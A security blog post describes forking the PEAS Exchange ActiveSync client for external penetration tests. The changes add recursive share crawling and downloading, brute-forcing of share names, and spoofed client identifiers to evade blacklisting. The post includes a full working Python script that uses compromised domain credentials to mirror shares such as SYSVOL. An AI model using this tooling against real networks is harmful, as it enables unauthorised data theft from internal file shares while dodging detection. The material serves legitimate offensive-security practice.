---
layout: post
title: "Tuning PEAS for Fun and Profit"
date: 2020-08-22 19:00:00 +0300
author: snovvcrash
categories: /dev
tags: [external-pentest, exchange, activesync, peas, python]
published: true
---

At the recent external pentest engagement I had a feeling that PEAS (Python Exchange ActiveSync client) is missing some handy features. For example, crawling shared folders and auto downloading discovered files would be a nice function to have as well as brute forcing potential shares by a wordlist. To save time I wrote a draft script at the time of the pentest, but then I decided to fork PEAS project and tune the source code.

<!--cut-->

![banner.png](/assets/images/tuning-peas-for-fun-and-profit/banner.png)
{:.center-image}

*"Would you like to be modified?"*
{:.quote}

* TOC
{:toc}

## Prologue

Few pentest experts would argue that if there is an OWA client on the perimeter, then be ready to collect loot. And that is because OWA means MS Exchange, and MS Exchange is not the best spot to demonstrate perfect security out of the box. [Time-based username enumeration](https://www.triaxiomsecurity.com/2019/03/15/vulnerability-walkthrough-timing-based-username-enumeration/) will give you account names and a [password spray](https://github.com/sensepost/ruler/wiki/Brute-Force#brute-force-for-credentials) will likely reveal some weak credentials in the domain.

One of the ways where to go next is a hunt for fileshares with juicy content through [Exchange ActiveSync](https://labs.f-secure.com/archive/accessing-internal-fileshares-through-exchange-activesync/). If you dare choose this path, then [PEAS](https://github.com/FSecureLABS/peas) by [@FSecureLABS](https://twitter.com/fsecurelabs) could become your loyal companion along the way, but there is quite a few things that could be upgraded in this tool very simply. I will fork PEAS and add some modifications to the code.

## Crawl & Dump Shared Folders

The first thing I felt the need for was the ability to recursively crawl the share searching for files by a given pattern. Let's say that the only share you were able to guess (or that you had access to) was DC's `SYSVOL`. Then it would be a pain to examine all the GUID style policy paths manually. If we could automate this process and add this `--download` option in order to mirror `SYSVOL` to an attacker's machine, then it would not be a big deal to run `find` through all the content and `xargs grep` for some extra hostnames / account names. That's exactly what [crawl_unc](https://github.com/snovvcrash/peas/blob/master/peas/__main__.py#L298) serves for:

[![peas-crawl-unc.png](/assets/images/tuning-peas-for-fun-and-profit/peas-crawl-unc.png)](/assets/images/tuning-peas-for-fun-and-profit/peas-crawl-unc.png)
{:.center-image}

## Brute Force Share Names

In case you did not find any additional names within `SYSVOL` contents, then you could try to enumerate shares with a brute force attack. The [hostnames.txt](https://github.com/snovvcrash/peas/blob/master/hostnames.txt) wordlist stores some common machine names that will be mutated on-the-fly using predefined patterns and a prefix string (if you provide one). That is what [brute_unc](https://github.com/snovvcrash/peas/blob/master/peas/__main__.py#L351) is responsible for:

[![peas-brute-unc.png](/assets/images/tuning-peas-for-fun-and-profit/peas-brute-unc.png)](/assets/images/tuning-peas-for-fun-and-profit/peas-brute-unc.png)
{:.center-image}

Because I can list the root directory of the share, there is no need to guess child folder names as well — they will appear if the machine have any.

## Fix Encoding

It is also worth noting, that PEAS will likely break if it encounters a non-en-US characters in a pathname. That can be [fixed](https://github.com/snovvcrash/peas/commit/fe5508700246710325b727558b49acd8d954e746) by removing explicitly set UTF-8 encoding.

## Mimic Legitimate Identifiers

As it is stated in [@ptswarm](https://twitter.com/ptswarm)'s [research](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/):

![ptswarm-peas-1.png](/assets/images/tuning-peas-for-fun-and-profit/ptswarm-peas-1.png)
{:.center-image}

![ptswarm-peas-2.png](/assets/images/tuning-peas-for-fun-and-profit/ptswarm-peas-2.png)
{:.center-image}

Because PEAS is just a **P**ython client for **EAS**, it needs to have a user-agent string and some other identifiers that can easily be fingerprinted and added to a blacklist. Anyways, [changing them](https://github.com/snovvcrash/peas/commit/ee288bef77fb69217a2442c9b5440cd830a7846b) is also quite a straightforward task.

## Draft Script

This is the draft script that was written at the time of engagement before forking PEAS:

```python
#!/usr/bin/env python

# Usage: python2 peas-crawl-shares.py -h

import os
import errno
from random import choice
from string import ascii_uppercase, digits
from argparse import ArgumentParser

import peas
from pathlib import Path, PureWindowsPath


def init_peas_client(server, domain_netbios, user, password):
	client = peas.Peas()
	client.disable_certificate_verification()

	client.set_creds({
		'server': server,
		'user': '%s\\%s' % (domain_netbios, user),
		'password': password,
	})

	print('[*] Auth result: %s' % client.check_auth())

	return client


def list_unc(client, uncpath, show_parent=True):
	records = client.get_unc_listing(uncpath)

	if show_parent:
		print('[*] Listing: %s\n' % (uncpath,))

	output = []
	for record in records:
		name = record.get('DisplayName')
		path = record.get('LinkId')
		is_folder = record.get('IsFolder') == '1'
		is_hidden = record.get('IsHidden') == '1'
		size = record.get('ContentLength', '0') + 'B'
		ctype = record.get('ContentType', '-')
		last_mod = record.get('LastModifiedDate', '-')
		created = record.get('CreationDate', '-')
		attrs = ('f' if is_folder else '-') + ('h' if is_hidden else '-')
		output.append("%s %-24s %-24s %-24s %-12s %s" % (attrs, created, last_mod, ctype, size, path))

	print('\n'.join(output))


def crawl_unc(client, uncpath, download=False):
	records = client.get_unc_listing(uncpath)
	for record in records:
		if record['IsFolder'] == '1':
			if record['LinkId'] == uncpath:
				continue
			crawl_unc(client, record['LinkId'], download)
		else:
			if download:
				try:
					data = client.get_unc_file(record['LinkId'])
				except TypeError:
					pass
				else:
					winpath = PureWindowsPath(record['LinkId'])
					posixpath = Path(winpath.as_posix()) # Windows path to POSIX path
					posixpath = Path(*posixpath.parts[1:]) # get rid of leading "/"
					dirpath = posixpath.parent
					dirpath = mkdir_p(dirpath)
					filename = str(dirpath / posixpath.name)
					try:
						with open(filename, 'w') as fd:
							fd.write(data)
					# If path name becomes too long when filename is added
					except IOError as e:
						if e.errno == errno.ENAMETOOLONG:
							dirpath = Path(dirpath.parts[0])
							extname = posixpath.suffix
							# Generate random name for the file and put it in the root share directory
							filename = ''.join(choice(ascii_uppercase + digits) for _ in range(8)) + extname
							filename = str(dirpath / filename)
							with open(filename, 'w') as fd:
								fd.write(data)
						else:
							raise

			list_unc(client, record['LinkId'], show_parent=False)


def mkdir_p(dirpath):
	try:
		dirname = str(dirpath)
		os.makedirs(dirname)
	except OSError as e:
		if e.errno == errno.EEXIST and os.path.isdir(dirname):
			pass
		# If directory path name already too long
		elif e.errno == errno.ENAMETOOLONG:
			dirpath = Path(dirpath.parts[0])
		else:
			raise

	return dirpath


if __name__ == '__main__':
	parser = ArgumentParser()
	parser.add_argument('-s', '--server', required=True, help='server')
	parser.add_argument('-d', '--domain-netbios', required=True, help='domain NetBIOS name')
	parser.add_argument('-u', '--user', required=True, help='username')
	parser.add_argument('-p', '--password', required=True, help='password')
	parser.add_argument('--uncpath', help='UNC path')
	parser.add_argument('--crawl-unc', action='store_true', help='recursively list all files within specified UNC path')
	parser.add_argument('--download', action='store_true', help='recursively list & download files within specified UNC path')

	args = parser.parse_args()

	client = init_peas_client(args.server, args.domain_netbios, args.user, args.password)
	list_unc(client, args.uncpath)

	if args.crawl_unc:
		if args.download:
			print('\n[*] Listing and downloading all files...\n')
		else:
			print('\n[*] Listing all files...\n')

		crawl_unc(client, args.uncpath, download=args.download)
```

## Modified PEAS

* [snovvcrash/peas](https://github.com/snovvcrash/peas)

## Refs

* [FSecureLABS/peas](https://github.com/FSecureLABS/peas)
* [Accessing Internal Fileshares through Exchange ActiveSync](https://labs.f-secure.com/archive/accessing-internal-fileshares-through-exchange-activesync/)
* [PEAS: Access internal fileshares through Exchange ActiveSync](https://labs.f-secure.com/tools/peas-access-internal-fileshares-through-exchange-activesync/)
* [Attacking MS Exchange Web Interfaces – PT SWARM](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
